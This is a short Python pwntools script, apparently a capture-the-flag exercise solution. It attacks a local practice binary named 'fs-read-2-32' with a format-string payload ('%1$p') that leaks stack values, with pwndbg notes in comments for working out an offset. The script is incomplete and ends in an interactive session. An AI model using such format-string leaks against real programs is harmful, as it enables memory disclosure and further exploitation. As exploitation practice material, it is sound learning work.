#!/usr/bin/env python


from pwn import *
import os

p = process("./fs-read-2-32")

print(p.recv())


buf = "%1$p"


p.sendline(buf)

rec = p.recv()
print(rec)
rec = rec[6:16]
print(rec)


'''
pwndbg> x/x 0xffcaafb8
0xffcaafb8:     0x70243125
'''
address = 0x70243125

'''

pwndbg> 0xffedc2a8
pwndbg> 0xffedc4e8


'''

offset = (0xffedc2a8 - 0xffedc4e8) / 4
print(offset)
p.interactive()
